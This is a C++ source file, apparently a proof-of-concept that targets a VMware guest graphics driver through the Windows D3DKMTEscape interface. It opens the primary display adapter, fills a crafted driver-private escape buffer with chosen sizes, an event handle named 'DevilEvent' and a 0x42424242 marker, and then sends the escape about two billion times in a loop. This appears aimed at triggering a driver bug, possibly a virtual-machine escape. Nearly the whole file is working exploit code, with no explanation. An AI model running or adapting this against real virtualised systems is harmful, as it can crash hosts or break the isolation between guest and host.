// TestVmwareEscape1.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
//#include <d3dkmthk.h>
#include <windows.h>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)


typedef UINT D3DKMT_HANDLE;
typedef UINT  D3DDDI_VIDEO_PRESENT_SOURCE_ID;



typedef struct _D3DDDI_ALLOCATIONLIST {
	D3DKMT_HANDLE hAllocation;
	union {
		struct {
			UINT WriteOperation : 1;
			UINT DoNotRetireInstance : 1;
#if ((DXGKDDI_INTERFACE_VERSION >= DXGKDDI_INTERFACE_VERSION_WIN8) || \
     (D3D_UMD_INTERFACE_VERSION >= D3D_UMD_INTERFACE_VERSION_WIN8))

			UINT OfferPriority : 3;
#else 
			UINT Reserved : 27;
#endif 
			UINT Reserved : 30;
		};
		UINT Value;
	};
} D3DDDI_ALLOCATIONLIST;

typedef struct _D3DDDI_PATCHLOCATIONLIST {
	UINT  AllocationIndex;
	union {
		struct {
			UINT SlotId : 24;
			UINT Reserved : 8;
		};
		UINT   Value;
	};
	UINT  DriverId;
	UINT  AllocationOffset;
	UINT  PatchOffset;
	UINT  SplitOffset;
} D3DDDI_PATCHLOCATIONLIST;

typedef struct _D3DKMT_CREATEDEVICEFLAGS {
	UINT LegacyMode : 1;
	UINT RequestVSync : 1;
#if (DXGKDDI_INTERFACE_VERSION >= DXGKDDI_INTERFACE_VERSION_WIN8)
	UINT DisableGpuTimeout : 1;
	UINT Reserved : 29;
#else 
	UINT Reserved : 30;
#endif 
} D3DKMT_CREATEDEVICEFLAGS;

typedef struct _D3DKMT_CREATEDEVICE {
	union {
		D3DKMT_HANDLE hAdapter;
		VOID          *pAdapter;
	};
	D3DKMT_CREATEDEVICEFLAGS Flags;
	D3DKMT_HANDLE            hDevice;
	VOID                     *pCommandBuffer;
	UINT                     CommandBufferSize;
	D3DDDI_ALLOCATIONLIST    *pAllocationList;
	UINT                     AllocationListSize;
	D3DDDI_PATCHLOCATIONLIST *pPatchLocationList;
	UINT                     PatchLocationListSize;
} D3DKMT_CREATEDEVICE;

typedef struct _D3DKMT_OPENADAPTERFROMHDC {
	HDC                            hDc;
	D3DKMT_HANDLE                  hAdapter;
	LUID                           AdapterLuid;
	D3DDDI_VIDEO_PRESENT_SOURCE_ID VidPnSourceId;
} D3DKMT_OPENADAPTERFROMHDC;

typedef struct _D3DDDI_CREATECONTEXTFLAGS {
	union {
		struct {
			UINT NullRendering : 1;
			UINT InitialData : 1;
			UINT Reserved : 30;
		};
		UINT   Value;
	};
} D3DDDI_CREATECONTEXTFLAGS;


typedef enum _D3DKMT_CLIENTHINT
{
	D3DKMT_CLIENTHINT_UNKNOWN = 0,
	D3DKMT_CLIENTHINT_OPENGL = 1,
	D3DKMT_CLIENTHINT_CDD = 2,       // Internal   ;internal
	D3DKMT_CLIENTHINT_DX7 = 7,
	D3DKMT_CLIENTHINT_DX8 = 8,
	D3DKMT_CLIENTHINT_DX9 = 9,
	D3DKMT_CLIENTHINT_DX10 = 10,
} D3DKMT_CLIENTHINT;

typedef struct _D3DKMT_CREATECONTEXT {
	D3DKMT_HANDLE             hDevice;
	UINT                      NodeOrdinal;
	UINT                      EngineAffinity;
	D3DDDI_CREATECONTEXTFLAGS Flags;
	VOID                      *pPrivateDriverData;
	UINT                      PrivateDriverDataSize;
	D3DKMT_CLIENTHINT         ClientHint;
	D3DKMT_HANDLE             hContext;
	VOID                      *pCommandBuffer;
	UINT                      CommandBufferSize;
	D3DDDI_ALLOCATIONLIST     *pAllocationList;
	UINT                      AllocationListSize;
	D3DDDI_PATCHLOCATIONLIST  *pPatchLocationList;
	UINT                      PatchLocationListSize;
	VOID					  *CommandBuffer;
} D3DKMT_CREATECONTEXT;


typedef enum _D3DKMT_ESCAPETYPE
{
	D3DKMT_ESCAPE_DRIVERPRIVATE = 0,
	D3DKMT_ESCAPE_VIDMM = 1,
	D3DKMT_ESCAPE_TDRDBGCTRL = 2,
	D3DKMT_ESCAPE_VIDSCH = 3,
	D3DKMT_ESCAPE_DEVICE = 4,
	D3DKMT_ESCAPE_DMM = 5,
	D3DKMT_ESCAPE_DEBUG_SNAPSHOT = 6,
	D3DKMT_ESCAPE_SETDRIVERUPDATESTATUS = 7
} D3DKMT_ESCAPETYPE;

typedef struct _D3DDDI_ESCAPEFLAGS {
	union {
		struct {
			UINT HardwareAccess : 1;
#if ((DXGKDDI_INTERFACE_VERSION >= DXGKDDI_INTERFACE_VERSION_WDDM1_3) || \
     (D3D_UMD_INTERFACE_VERSION >= D3D_UMD_INTERFACE_VERSION_WDDM1_3))

			UINT DeviceStatusQuery : 1;
			UINT ChangeFrameLatency : 1;
			UINT Reserved : 29;
#else 
			UINT Reserved : 31;
#endif 
		};
		UINT   Value;
	};
} D3DDDI_ESCAPEFLAGS;

typedef struct _D3DKMT_ESCAPE {
	D3DKMT_HANDLE      hAdapter;
	D3DKMT_HANDLE      hDevice;
	D3DKMT_ESCAPETYPE  Type;
	D3DDDI_ESCAPEFLAGS Flags;
	VOID               *pPrivateDriverData;
	UINT               PrivateDriverDataSize;
	D3DKMT_HANDLE      hContext;
} D3DKMT_ESCAPE;


typedef NTSTATUS(NTAPI *_D3DKMTOpenAdapterFromHdc)
(
	D3DKMT_OPENADAPTERFROMHDC *pData
	);

typedef NTSTATUS(NTAPI *_D3DKMTEscape)
(
	D3DKMT_ESCAPE *pData
	);

typedef NTSTATUS(NTAPI *_D3DKMTCreateDevice)
(
	D3DKMT_CREATEDEVICE *pData
);

typedef NTSTATUS(NTAPI *_D3DKMTCreateContext)
(
	D3DKMT_CREATECONTEXT *pData
);


HMODULE hModuleGdi32 = NULL;
_D3DKMTOpenAdapterFromHdc D3DKMTOpenAdapterFromHdc = NULL;
_D3DKMTEscape D3DKMTEscape = NULL;
_D3DKMTCreateDevice D3DKMTCreateDevice = NULL;
_D3DKMTCreateContext D3DKMTCreateContext = NULL;

typedef struct _DRIVER_INFO {
	HDC                  hDC;
	D3DKMT_HANDLE        hAdapter;
	D3DKMT_CREATEDEVICE  device;
	D3DKMT_CREATECONTEXT context;
} DRIVER_INFO, *PDRIVER_INFO;


void show_display_devices(void)
{
	int display_number = 0;
	PDISPLAY_DEVICEA pDisplayDevice = (PDISPLAY_DEVICEA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DISPLAY_DEVICEA));
	pDisplayDevice->cb = sizeof(DISPLAY_DEVICEA);
	while (EnumDisplayDevicesA(NULL, display_number, pDisplayDevice, EDD_GET_DEVICE_INTERFACE_NAME))
	{
		printf("DeviceName: %s\n", pDisplayDevice->DeviceName);
		printf("DeviceString: %s\n", pDisplayDevice->DeviceString);
		memset(pDisplayDevice, 0x00, sizeof(DISPLAY_DEVICEA));
		pDisplayDevice->cb = sizeof(DISPLAY_DEVICEA);
		display_number++;
	}
	HeapFree(GetProcessHeap(), 0, pDisplayDevice);
}

void resolve_functions(void) 
{
	hModuleGdi32 = LoadLibraryA("gdi32.dll");
	D3DKMTOpenAdapterFromHdc = (_D3DKMTOpenAdapterFromHdc)GetProcAddress(hModuleGdi32, "D3DKMTOpenAdapterFromHdc");
	D3DKMTCreateDevice = (_D3DKMTCreateDevice)GetProcAddress(hModuleGdi32, "D3DKMTCreateDevice");
	D3DKMTCreateContext = (_D3DKMTCreateContext)GetProcAddress(hModuleGdi32, "D3DKMTCreateContext");
	D3DKMTEscape = (_D3DKMTEscape)GetProcAddress(hModuleGdi32, "D3DKMTEscape");
}


NTSTATUS initDriver(PDRIVER_INFO pDriverInfo)
{
	int iDispIndex = 0;
	D3DKMT_OPENADAPTERFROMHDC oafh;
	HDC hdc = NULL;
	DISPLAY_DEVICEA dd;
	NTSTATUS status = E_FAIL;
	int i;

	memset(&dd, 0, sizeof(dd));
	dd.cb = sizeof(dd);

	for (i = 0; EnumDisplayDevicesA(NULL, i, &dd, 0); ++i) {
		if (dd.StateFlags & DISPLAY_DEVICE_PRIMARY_DEVICE) {
			break;
		}
	}

	hdc = CreateDCA(NULL, dd.DeviceName, NULL, NULL);

	if (hdc == NULL) {
		printf("Failed to CreateDC");
		return E_FAIL;
	}
	pDriverInfo->hDC = hdc;

	// Get adapter from hDC
	oafh.hDc = pDriverInfo->hDC;
	status = D3DKMTOpenAdapterFromHdc(&oafh);

	if (!NT_SUCCESS(status)) {
		printf("OpenAdapterFromHdc failed (%x)", status);
		return status;
	}
	pDriverInfo->hAdapter = oafh.hAdapter;

	// Create device
	pDriverInfo->device.hAdapter = pDriverInfo->hAdapter;
	status = D3DKMTCreateDevice(&pDriverInfo->device);

	if (!NT_SUCCESS(status)) {
		printf("Failed to create device (%x)", status);
		return status;
	}

	// Create context
	pDriverInfo->context.NodeOrdinal = 0;
	pDriverInfo->context.hDevice = pDriverInfo->device.hDevice;
	status = D3DKMTCreateContext(&pDriverInfo->context);

	if (!NT_SUCCESS(status)) {
		printf("Failed to create context (%x)", status);
		return status;
	}

	return S_OK;
}


int main()
{
	DRIVER_INFO driverInfo = { 0 };
	D3DKMT_ESCAPE escapeObj = { 0 };
	int status;

	resolve_functions();
	initDriver(&driverInfo);

	if (!NT_SUCCESS(initDriver(&driverInfo))) {
		printf("Could not initialize connection to driver");
		return -1;
	}
	printf("Initialized driver\n");

	escapeObj.Type = D3DKMT_ESCAPE_DRIVERPRIVATE;
	escapeObj.hAdapter = driverInfo.hAdapter;
	escapeObj.hDevice = (D3DKMT_HANDLE)NULL;

	unsigned short escape_size = 0x12C;

	PVOID memory = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, escape_size);
	/*
	95244b0c  00000001 00000124 00020000 00000018
	95244b1c  00000100 00000000 00000000 00000000
	*/
	*(void **)((char *)memory + sizeof(void *) * 0) = (void *)0x01;
	*(void **)((char *)memory + sizeof(void *) * 1) = (void *)(escape_size - 0x08);
	*(void **)((char *)memory + sizeof(void *) * 2) = (void *)0x20000;
	*(void **)((char *)memory + sizeof(void *) * 3) = (void *)0x18;
	*(void **)((char *)memory + sizeof(void *) * 4) = (void *)0x100;

	HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("DevilEvent"));
	*(void **)((char *)memory + sizeof(void *) * 7) = (void *)hEvent;
	*(void **)((char *)memory + sizeof(void *) * 8) = (void *)0x42424242;


	escapeObj.pPrivateDriverData = memory;
	escapeObj.PrivateDriverDataSize = escape_size;
	for(int i=0; i<2147483647; i++)
	status = D3DKMTEscape(&escapeObj);

	if (!NT_SUCCESS(status)) {
		printf("D3DKMTEscape failed (%x)", status);
	}


	CloseHandle(hEvent);
	HeapFree(GetProcessHeap(), 0, memory);
	
	printf("done\n");


	return 0; 
}